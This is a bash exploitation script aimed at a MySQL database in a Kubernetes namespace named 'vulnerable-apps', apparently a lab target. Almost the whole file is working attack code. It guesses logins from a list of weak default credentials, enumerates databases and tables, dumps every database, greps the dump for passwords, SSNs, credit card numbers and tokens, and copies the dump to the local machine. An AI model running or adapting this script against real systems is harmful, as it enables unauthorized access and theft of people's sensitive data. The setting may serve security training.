#!/bin/bash

# Script to exploit the vulnerable database and perform a complete dump
# Uses weak credentials to access MySQL and dump all data

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"

echo -e "${BLUE}=== Database Exploitation and Dump ===${NC}"
echo -e "${GREEN}Namespace: $NAMESPACE${NC}\n"

# Get database service info
DB_SERVICE=$(kubectl get svc -n "$NAMESPACE" | grep database | awk '{print $1}' | head -1)
if [ -z "$DB_SERVICE" ]; then
    echo -e "${RED}Database service not found${NC}"
    exit 1
fi

DB_POD=$(kubectl get pods -n "$NAMESPACE" -l app=vulnerable-database -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [ -z "$DB_POD" ]; then
    echo -e "${RED}Database pod not found${NC}"
    exit 1
fi

echo -e "${GREEN}Database Service: $DB_SERVICE${NC}"
echo -e "${GREEN}Database Pod: $DB_POD${NC}\n"

# Try multiple weak credentials
CREDENTIALS=(
    "root:root123"
    "admin:admin123"
    "root:"
    "root:root"
    "admin:admin"
    "test:test123"
)

echo -e "${YELLOW}[1] Attempting to connect with weak credentials...${NC}"
DB_HOST="${DB_SERVICE}.${NAMESPACE}.svc.cluster.local"

for cred in "${CREDENTIALS[@]}"; do
    USER=$(echo "$cred" | cut -d: -f1)
    PASS=$(echo "$cred" | cut -d: -f2)
    
    echo -e "${YELLOW}Trying: $USER / ${PASS:-<empty>}${NC}"
    
    if kubectl exec -n "$NAMESPACE" "$DB_POD" -- sh -c "
        mysql -h$DB_HOST -u$USER ${PASS:+-p$PASS} -e 'SELECT 1' 2>&1 | head -1
    " 2>&1 | grep -q "ERROR"; then
        continue
    else
        echo -e "${GREEN}✓ Successfully connected with: $USER / ${PASS:-<empty>}${NC}"
        WORKING_USER="$USER"
        WORKING_PASS="$PASS"
        break
    fi
done

if [ -z "$WORKING_USER" ]; then
    echo -e "${RED}✗ Could not connect with any credentials${NC}"
    exit 1
fi

# List databases
echo -e "\n${YELLOW}[2] Listing databases...${NC}"
kubectl exec -n "$NAMESPACE" "$DB_POD" -- sh -c "
    mysql -h$DB_HOST -u$WORKING_USER ${WORKING_PASS:+-p$WORKING_PASS} -e 'SHOW DATABASES;'
"

# List tables in each database
echo -e "\n${YELLOW}[3] Listing tables...${NC}"
kubectl exec -n "$NAMESPACE" "$DB_POD" -- sh -c "
    mysql -h$DB_HOST -u$WORKING_USER ${WORKING_PASS:+-p$WORKING_PASS} -e '
        SELECT table_schema, table_name 
        FROM information_schema.tables 
        WHERE table_schema NOT IN (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")
        ORDER BY table_schema, table_name;
    '
"

# Dump all databases
echo -e "\n${YELLOW}[4] Performing complete database dump...${NC}"
DUMP_FILE="/tmp/database_dump_$(date +%Y%m%d_%H%M%S).sql"

kubectl exec -n "$NAMESPACE" "$DB_POD" -- sh -c "
    mysqldump -h$DB_HOST -u$WORKING_USER ${WORKING_PASS:+-p$WORKING_PASS} \
        --all-databases \
        --routines \
        --triggers \
        --events \
        --single-transaction \
        --quick \
        --lock-tables=false \
        > $DUMP_FILE 2>&1 && \
    echo 'Dump completed' && \
    ls -lh $DUMP_FILE && \
    echo '' && \
    echo '=== Dump Preview (first 100 lines) ===' && \
    head -100 $DUMP_FILE
"

# Extract sensitive data
echo -e "\n${YELLOW}[5] Extracting sensitive data...${NC}"
kubectl exec -n "$NAMESPACE" "$DB_POD" -- sh -c "
    echo '=== Searching for sensitive patterns ===' && \
    grep -iE 'password|ssn|credit|card|secret|token|key|credential' $DUMP_FILE | head -20 || \
    echo 'No obvious sensitive patterns found'
"

# Download dump to local machine
echo -e "\n${YELLOW}[6] Downloading dump file...${NC}"
LOCAL_DUMP_FILE="database_dump_$(date +%Y%m%d_%H%M%S).sql"
kubectl cp "$NAMESPACE/$DB_POD:$DUMP_FILE" "$LOCAL_DUMP_FILE" 2>&1 && \
    echo -e "${GREEN}✓ Dump saved to: $LOCAL_DUMP_FILE${NC}" || \
    echo -e "${YELLOW}⚠ Could not download dump (you can access it in the pod at $DUMP_FILE)${NC}"

# Show table contents
echo -e "\n${YELLOW}[7] Showing table contents...${NC}"
kubectl exec -n "$NAMESPACE" "$DB_POD" -- sh -c "
    mysql -h$DB_HOST -u$WORKING_USER ${WORKING_PASS:+-p$WORKING_PASS} -e '
        SELECT table_schema, table_name 
        FROM information_schema.tables 
        WHERE table_schema NOT IN (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")
        LIMIT 5;
    ' | while read db table; do
        if [ \"\$db\" != \"table_schema\" ] && [ -n \"\$table\" ]; then
            echo \"=== \$db.\$table ===\"
            mysql -h$DB_HOST -u$WORKING_USER ${WORKING_PASS:+-p$WORKING_PASS} -e \"SELECT * FROM \$db.\$table LIMIT 10;\" 2>/dev/null || echo \"Could not read table\"
            echo \"\"
        fi
    done
"

echo -e "\n${GREEN}=== Database Exploitation Complete ===${NC}"
echo -e "${YELLOW}Credentials used: $WORKING_USER / ${WORKING_PASS:-<empty>}${NC}"
echo -e "${YELLOW}Dump file location: $DUMP_FILE (in pod)${NC}"
if [ -f "$LOCAL_DUMP_FILE" ]; then
    echo -e "${YELLOW}Local dump file: $LOCAL_DUMP_FILE${NC}"
fi

